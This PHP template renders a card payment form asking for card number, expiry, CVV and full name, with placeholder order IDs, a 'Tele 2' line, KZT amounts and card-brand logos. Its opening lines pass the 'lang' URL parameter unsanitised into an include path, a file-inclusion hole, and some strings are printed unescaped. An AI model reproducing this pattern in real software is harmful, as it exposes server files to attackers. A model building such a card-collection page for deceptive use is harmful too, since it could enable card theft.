<?php 
	$currentLang = $_GET['lang'] ?? 'ru';

    $formLangFile = "lang/{$currentLang}/form-card.php";
    if (!file_exists($formLangFile)) {
        $formLangFile = "lang/ru/form-card.php";
    }
    $formLang = include $formLangFile;

	include("header.php");
?>
<title>Exchange ENG</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
</head>

<body style="background: #F3F3F3;">
    <main style="display: flex; flex-direction: column; align-items: center; justify-content: center;">
        
        <section class="payment-card">
            <h1 class="payment-card__title"><?= htmlspecialchars($formLang['title']) ?></h1>
            <form class="payment-form payment-body js-card-payment-form" onsubmit="return validateForm(event)" novalidate>
                <div class="payment-card__body">
                    <div class="payment-form__container">
                        <div class="payment-form__block payment-form__block--sender">
                            <div class="payment-form__row">
                                <div class="payment-form__wrapper full-width">
                                    <input 
                                        type="text" 
                                        data-type="card-number" 
                                        class="payment-form__input" 
                                        name="senderCard" 
                                        placeholder="<?= htmlspecialchars($formLang['card_number']) ?>" 
                                        maxlength="19" 
                                        required 
                                        pattern="\d{19}" 
                                    />
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none"><path stroke="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 11v4.8c0 1.12 0 1.68.218 2.108a2 2 0 0 0 .874.874c.427.218.987.218 2.105.218h11.606c1.118 0 1.677 0 2.104-.218.377-.192.683-.498.875-.874.218-.428.218-.986.218-2.104V11M3 11V9m0 2h18M3 9v-.8c0-1.12 0-1.68.218-2.108.192-.377.497-.682.874-.874C4.52 5 5.08 5 6.2 5h11.6c1.12 0 1.68 0 2.107.218.377.192.683.497.875.874.218.427.218.987.218 2.105V9M3 9h18M7 15h4m10-4V9"/></svg>
                                </div>
                            </div>
                            <div class="payment-form__row">
                                <div class="payment-form__wrapper half-width">
                                    <input 
                                        type="text" 
                                        class="payment-form__input" 
                                        name="expiry" 
                                        id="expiry" 
                                        placeholder="<?= htmlspecialchars($formLang['expiry']) ?>" 
                                        required 
                                        pattern="\d{2}\/\d{2}" 
                                        oninput="formatExpiry(this)" 
                                    />
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none"><path stroke="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M6.667 3.333H6c-.933 0-1.4 0-1.757.182-.313.16-.568.415-.728.728-.182.357-.182.824-.182 1.757v.667m3.334-3.334h6.667m-6.667 0V1.667m6.667 1.666H14c.934 0 1.4 0 1.756.182.314.16.57.415.73.728.18.356.18.823.18 1.754v.67m-3.332-3.334V1.667m-10 5V14c0 .934 0 1.4.181 1.757.16.313.415.568.728.728.356.182.823.182 1.755.182h8.005c.931 0 1.397 0 1.753-.182.314-.16.57-.415.73-.728.18-.357.18-.822.18-1.754V6.667m-13.332 0h13.333m-3.334 6.666h.002v.002h-.002v-.002Zm-3.333 0h.002v.002H10v-.002Zm-3.333 0h.002v.002h-.002v-.002ZM13.335 10v.002h-.002V10h.002ZM10 10h.002v.002H10V10Zm-3.333 0h.002v.002h-.002V10Z"/></svg>
                                </div>
                                <div class="payment-form__wrapper half-width">
                                    <input 
                                        type="text" 
                                        class="payment-form__input" 
                                        name="cvv" 
                                        placeholder="<?= htmlspecialchars($formLang['cvv']) ?>" 
                                        required 
                                        pattern="\d{3}" 
                                        maxlength="3" 
                                        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 3)" 
                                    />
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="21" fill="none"><path stroke="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7.692 8H6c-.933 0-1.4 0-1.757.182-.313.16-.568.414-.728.728-.182.356-.182.823-.182 1.757v4.667c0 .933 0 1.4.182 1.756.16.314.415.569.728.729C4.6 18 5.066 18 5.998 18h8.005c.931 0 1.397 0 1.753-.181.314-.16.57-.415.73-.73.18-.355.18-.821.18-1.753v-4.672c0-.932 0-1.398-.18-1.754a1.668 1.668 0 0 0-.73-.728C15.4 8 14.934 8 14 8h-1.692M7.692 8h4.616M7.692 8a.192.192 0 0 1-.192-.192V5.5a2.5 2.5 0 0 1 5 0v2.308a.193.193 0 0 1-.192.192"/></svg>
                                </div>
                            </div>
                            <div class="payment-form__row">
                                <div class="payment-form__wrapper full-width">
                                    <input 
                                        type="text" 
                                        class="payment-form__input" 
                                        id="senderFullName" 
                                        name="senderFullName" 
                                        placeholder="<?= htmlspecialchars($formLang['fullname']) ?>" 
                                        required 
                                    />
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none"><path stroke="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16.667 17.5c0-2.301-2.985-4.167-6.667-4.167S3.333 15.2 3.333 17.5M10 10.833A4.167 4.167 0 1 1 10 2.5a4.167 4.167 0 0 1 0 8.333Z"/></svg>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="payment-card">
                    <div class="payment-card__body">
                        <div class="payment-card__body-item">
                            <div><p><?= $formLang['something'] ?>:</p><span>66609123FG11</span></div>
                            <div><p><?= $formLang['order'] ?>:</p><span>1238998123121111F</span></div>
                            <div><p><?= $formLang['transaction'] ?>:</p><span>22216785555UI9</span></div>
                            <div><p><?= $formLang['company'] ?>:</p><span>Tele 2</span></div>
                        </div>
                        <div class="payment-card__body-item">
                            <div><p><?= $formLang['amount'] ?>:</p><span>0,00 KZT</span></div>
                            <div><p><?= $formLang['commission'] ?>:</p><span>0,00 KZT</span></div>
                        </div>
                        <div class="payment-card__footer">
                            <button type="submit" class="payment-form__pay-btn" disabled>
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none"><path stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 11v4.8c0 1.12 0 1.68.218 2.108a2 2 0 0 0 .874.874c.427.218.987.218 2.105.218h11.606c1.118 0 1.677 0 2.104-.218.377-.192.683-.498.875-.874.218-.428.218-.986.218-2.104V11M3 11V9m0 2h18M3 9v-.8c0-1.12 0-1.68.218-2.108.192-.377.497-.682.874-.874C4.52 5 5.08 5 6.2 5h11.6c1.12 0 1.68 0 2.107.218.377.192.683.497.875.874.218.427.218.987.218 2.105V9M3 9h18M7 15h4m10-4V9"/></svg>
                                <?= htmlspecialchars($formLang['pay_button']) ?>
                                <svg class="payment-form__submit" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none"><path fill="#fff" stroke="#fff" d="M12 22c5.421 0 10-4.579 10-10h-2c0 4.337-3.663 8-8 8s-8-3.663-8-8 3.663-8 8-8V2C6.579 2 2 6.58 2 12c0 5.421 4.579 10 10 10Z"/></svg>
                            </button>
                            <div class="payment-form__note">
                                <?= $formLang['note'] ?>
                            </div>
                        </div>
                    </div>
                </div>
            </form>
        </section>

        <section class="payment-logo">
            <img src="assets/img/mastercard-logo.png" alt="mastercard logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="49" height="31" fill="none"><g clip-path="url(#a)"><path fill="#0E4595" d="M2.513-.113h43.974A2.506 2.506 0 0 1 49 2.385v26.23a2.505 2.505 0 0 1-2.513 2.499H2.513A2.505 2.505 0 0 1 0 28.616V2.385A2.506 2.506 0 0 1 2.513-.113Z"/><path fill="#fff" d="M17.528 21.666 19.624 9.44h3.352l-2.097 12.226h-3.35Zm15.46-11.963a8.702 8.702 0 0 0-3.003-.513c-3.313 0-5.646 1.658-5.665 4.035-.02 1.757 1.665 2.736 2.936 3.321 1.305.6 1.744.982 1.738 1.517-.009.82-1.042 1.194-2.006 1.194-1.341 0-2.054-.186-3.155-.642l-.432-.194-.47 2.737c.783.341 2.23.637 3.734.652 3.523 0 5.81-1.64 5.837-4.177.012-1.39-.88-2.45-2.815-3.322-1.171-.566-1.889-.943-1.881-1.516 0-.508.607-1.051 1.92-1.051a6.216 6.216 0 0 1 2.508.468l.3.141.455-2.65Zm8.627-.263h-2.59c-.803 0-1.403.217-1.756 1.014l-4.978 11.204h3.52s.575-1.507.706-1.837l4.293.005c.1.428.407 1.832.407 1.832h3.11L41.616 9.439Zm-4.11 7.894c.277-.704 1.336-3.417 1.336-3.417-.02.033.275-.708.444-1.167l.227 1.054.776 3.53h-2.783ZM14.682 9.44l-3.281 8.337-.35-1.694c-.61-1.953-2.514-4.07-4.642-5.129l3 10.692 3.547-.004L18.233 9.44h-3.55"/><path fill="#F2AE14" d="M8.339 9.44H2.933l-.042.254c4.205 1.012 6.987 3.458 8.142 6.396l-1.175-5.618c-.203-.774-.791-1.005-1.52-1.033"/></g><defs><clipPath id="a"><path fill="#fff" d="M0 0h49v31H0z"/></clipPath></defs></svg>
            <img src="assets/img/pci-logo.png" alt="Pci logo">
        </section>

        
    </main>

<?php include("footer.php"); ?>